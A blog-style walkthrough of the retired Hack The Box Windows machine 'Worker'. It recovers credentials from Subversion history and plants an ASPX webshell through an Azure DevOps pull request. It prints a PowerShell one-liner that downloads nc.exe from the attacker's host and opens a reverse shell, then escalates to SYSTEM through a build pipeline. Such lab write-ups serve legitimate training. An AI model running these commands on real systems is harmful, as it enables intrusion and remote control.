---
layout: post  
title: "Worker: Hack The Box Walkthrough"
date: 2021-02-01 21:28:06 +0000
last_modified_at: 2021-02-01 21:28:06 +0000
category: Walkthrough
tags: ["Hack The Box", Worker, retired, Windows, Medium]
comments: true
protect: false
image:
  feature: worker-htb-walkthrough.png
---

This post documents the complete walkthrough of Worker, a retired vulnerable [VM][1] created by [ekenas][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Worker is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.203 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-17 05:22:28 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.203
Discovered open port 5985/tcp on 10.10.10.203
Discovered open port 3690/tcp on 10.10.10.203
```

Nothing unusual stood out. Let's do one better with nmap scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p80,3690,5985 -A --reason 10.10.10.203 -oN nmap.txt
...
PORT     STATE SERVICE  REASON          VERSION
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve syn-ack ttl 127 Subversion
5985/tcp open  http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

Interesting. Looks like we have a Windows machine. This is what the `http` service looks like.

{% include image.html image_alt="552fb2bc.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/552fb2bc.png" %}

What a shit-show.

### Subversion

Since Subversion is available, let's use the nifty `svn` client to see what we can find.

```
# svn log -v svn://10.10.10.203
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 13:52:00 +0000 (Sat, 20 Jun 2020) | 1 line
Changed paths:
   A /moved.txt

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 13:50:20 +0000 (Sat, 20 Jun 2020) | 1 line
Changed paths:
   D /deploy.ps1

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 13:46:19 +0000 (Sat, 20 Jun 2020) | 1 line
Changed paths:
   M /deploy.ps1

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 13:45:16 +0000 (Sat, 20 Jun 2020) | 1 line
Changed paths:
   A /deploy.ps1

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 13:43:43 +0000 (Sat, 20 Jun 2020) | 1 line
Changed paths:
   A /dimension.worker.htb
   A /dimension.worker.htb/LICENSE.txt
   A /dimension.worker.htb/README.txt
   A /dimension.worker.htb/assets
   A /dimension.worker.htb/assets/css
   A /dimension.worker.htb/assets/css/fontawesome-all.min.css
   A /dimension.worker.htb/assets/css/main.css
   A /dimension.worker.htb/assets/css/noscript.css
   A /dimension.worker.htb/assets/js
   A /dimension.worker.htb/assets/js/breakpoints.min.js
   A /dimension.worker.htb/assets/js/browser.min.js
   A /dimension.worker.htb/assets/js/jquery.min.js
   A /dimension.worker.htb/assets/js/main.js
   A /dimension.worker.htb/assets/js/util.js
   A /dimension.worker.htb/assets/sass
   A /dimension.worker.htb/assets/sass/base
   A /dimension.worker.htb/assets/sass/base/_page.scss
   A /dimension.worker.htb/assets/sass/base/_reset.scss
   A /dimension.worker.htb/assets/sass/base/_typography.scss
   A /dimension.worker.htb/assets/sass/components
   A /dimension.worker.htb/assets/sass/components/_actions.scss
   A /dimension.worker.htb/assets/sass/components/_box.scss
   A /dimension.worker.htb/assets/sass/components/_button.scss
   A /dimension.worker.htb/assets/sass/components/_form.scss
   A /dimension.worker.htb/assets/sass/components/_icon.scss
   A /dimension.worker.htb/assets/sass/components/_icons.scss
   A /dimension.worker.htb/assets/sass/components/_image.scss
   A /dimension.worker.htb/assets/sass/components/_list.scss
   A /dimension.worker.htb/assets/sass/components/_table.scss
   A /dimension.worker.htb/assets/sass/layout
   A /dimension.worker.htb/assets/sass/layout/_bg.scss
   A /dimension.worker.htb/assets/sass/layout/_footer.scss
   A /dimension.worker.htb/assets/sass/layout/_header.scss
   A /dimension.worker.htb/assets/sass/layout/_main.scss
   A /dimension.worker.htb/assets/sass/layout/_wrapper.scss
   A /dimension.worker.htb/assets/sass/libs
   A /dimension.worker.htb/assets/sass/libs/_breakpoints.scss
   A /dimension.worker.htb/assets/sass/libs/_functions.scss
   A /dimension.worker.htb/assets/sass/libs/_mixins.scss
   A /dimension.worker.htb/assets/sass/libs/_vars.scss
   A /dimension.worker.htb/assets/sass/libs/_vendor.scss
   A /dimension.worker.htb/assets/sass/main.scss
   A /dimension.worker.htb/assets/sass/noscript.scss
   A /dimension.worker.htb/assets/webfonts
   A /dimension.worker.htb/assets/webfonts/fa-brands-400.eot
   A /dimension.worker.htb/assets/webfonts/fa-brands-400.svg
   A /dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
   A /dimension.worker.htb/assets/webfonts/fa-brands-400.woff
   A /dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
   A /dimension.worker.htb/assets/webfonts/fa-regular-400.eot
   A /dimension.worker.htb/assets/webfonts/fa-regular-400.svg
   A /dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
   A /dimension.worker.htb/assets/webfonts/fa-regular-400.woff
   A /dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
   A /dimension.worker.htb/assets/webfonts/fa-solid-900.eot
   A /dimension.worker.htb/assets/webfonts/fa-solid-900.svg
   A /dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
   A /dimension.worker.htb/assets/webfonts/fa-solid-900.woff
   A /dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
   A /dimension.worker.htb/images
   A /dimension.worker.htb/images/bg.jpg
   A /dimension.worker.htb/images/overlay.png
   A /dimension.worker.htb/images/pic01.jpg
   A /dimension.worker.htb/images/pic02.jpg
   A /dimension.worker.htb/images/pic03.jpg
   A /dimension.worker.htb/index.html

First version
------------------------------------------------------------------------
```

I wonder what's in `deploy.ps1` revision 2?

```
# svn cat svn://10.10.10.203/deploy.ps1@r2
$user = "nathen"
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

What about `moved.txt`?

```
# svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

### Azure DevOps

The credentials (`nathen:wendel98`) work for `devops.worker.htb`.

{% include image.html image_alt="6dbcd57a.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/6dbcd57a.png" %}

#### Mapping repos to virtual hosts

There are many repositories under the SmartHotel360 project. I wonder where have I seen `dimension` before?

{% include image.html image_alt="923ae752.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/923ae752.png" %}

Right. It was mentioned that `dimension.worker.htb` was moved to `devops.worker.htb`. Putting two and two together, each repository must correspond to a virtual host.

{% include image.html image_alt="aa354ff8.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/aa354ff8.png" %}

Bingo! I later discovered this in `http://dimension.worker.htb/#work`. :laughing:

{% include image.html image_alt="a79e02b1.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/a79e02b1.png" %}

#### Dropping ASPX webshell

Let's see if we can drop a ASPX webshell into one of the repos. After some trial-and-error, the way to do it is via pull request. Long story short, we have to add the webshell to a temporary branch, and after review (by yourself :laughing:) and approval, create a pull request to merge the temporary branch to the `master` branch.

There's a small caveat. The repo will revert itself to its original state after a short while (I don't know, like every five minutes?). Essentially you only have a short window of opportunity to get a reverse shell.

___Commit to a new branch___

{% include image.html image_alt="2428dcdc.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/2428dcdc.png" %}

___Add a reviewer___

{% include image.html image_alt="b97dcc6f.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/b97dcc6f.png" %}

___Review and approve the pull request___

{% include image.html image_alt="ec3b4766.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/ec3b4766.png" %}

___Complete the pull request___

{% include image.html image_alt="5aec4fca.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/5aec4fca.png" %}

And we have remote command execution!

{% include image.html image_alt="62c88634.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/62c88634.png" %}

Remember our window of opportunity is short. Prepare the following command to transfer `nc.exe` to `C:\Windows\Temp` (default writeable folder) and launch a reverse shell immediately.

```
powershell /c iwr http://10.10.14.42/nc.exe -outf \windows\temp\cute.exe && start \windows\temp\cute.exe 10.10.14.42 1234 -e cmd.exe
```

## Foothold

{% include image.html image_alt="541132bb.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/541132bb.png" %}

Sweet.

### Getting `user.txt`

During enumeration of this account, I found the W: drive and `W:\svnrepos\www\conf\passwd`.

{% include image.html image_alt="6601d091.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/6601d091.png" %}

Incidentally, `robisl` is listed in `C:\Users` and is a member of the local group **Remote Management Users**, which means that I can log in remotely via WinRM, i.e. Evil-WinRM.

{% include image.html image_alt="d4bd7cbf.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/d4bd7cbf.png" %}

No surprise, the file `user.txt` is at `robisl`'s Desktop.

{% include image.html image_alt="3de9ef49.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/3de9ef49.png" %}

## Privilege Escalation

Besides being a member in the **Remote Management Users** group, `robisl` is also a member of the **Production** group. This means `robisl` is able to log in to `devops.worker.htb`.

{% include image.html image_alt="3af07d44.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/3af07d44.png" %}

More importanly, `robisl` is able to build!

{% include image.html image_alt="0cf483b4.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/0cf483b4.png" %}

### Launching a reverse shell from the build pipeline

Azure DevOps provisions for the execution of scripts during the build process: be it command line scripts or Powershell commands. Let's go through that process.

#### Creating a build pipeline

{% include image.html image_alt="4ea7849e.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/4ea7849e.png" %}

Click on the blue button to create a new pipeline.

#### Azure Repos Git (YAML)

{% include image.html image_alt="e96f8340.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/e96f8340.png" %}

Select Azure Repos Git.

#### Select the repository

{% include image.html image_alt="b65ba1e5.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/b65ba1e5.png" %}

Select the one and only repository.

#### Configure your pipeline

{% include image.html image_alt="b5e65aca.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/b5e65aca.png" %}

Select ASP.NET Core.

#### Review your pipeline

{% include image.html image_alt="1c61a4f1.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/1c61a4f1.png" %}

That's it. We're going to leverage on the `nc.exe` (renamed as `cute.exe`) that's already in `C:\Windows\Temp`.

#### Save and run

For some reason, we've to use pull request instead of committing directly to the `master` branch.

{% include image.html image_alt="44285ae7.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/44285ae7.png" %}

Save and run.

### Getting `root.txt`

A shell appears in my `nc` listener!

{% include image.html image_alt="a416967f.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/a416967f.png" %}

Getting `root.txt` with **NT AUTHORITY\SYSTEM** is a breeze.

{% include image.html image_alt="6e46bab8.png" image_src="/4bb7921f-c072-4837-84bf-a86cff0b3e17/6e46bab8.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/270
[2]: https://www.hackthebox.eu/home/users/profile/222808
[3]: https://www.hackthebox.eu/
